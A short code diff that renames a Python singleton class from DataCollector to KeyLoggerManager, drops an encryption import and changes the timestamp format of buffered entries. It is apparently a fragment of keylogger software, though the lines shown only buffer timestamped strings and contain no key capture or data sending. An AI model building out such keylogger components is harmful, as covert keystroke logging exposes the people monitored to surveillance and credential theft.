@@ -1,10 +1,10 @@
 import threading
 import time
 from datetime import datetime
-from encryption import Encryption
 
 
-class DataCollector:
+
+class  KeyLoggerManager:
     _instance = None
 
     def __new__(cls, file_writer, encryptor):
@@ -16,7 +16,6 @@ class DataCollector:
         if getattr(self, "_initialized", False):
             return
         self._initialized = True
-
         self.collect_interval = 5
         self.flush_interval = 300
         self.buffer = []
@@ -31,7 +30,7 @@ class DataCollector:
 
     def add_data(self, data: str):
         with self.lock:
-            timestamp = datetime.now().isoformat()
+            timestamp = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
             self.buffer.append(f"{timestamp} - {data}")
 
     def _collector(self):
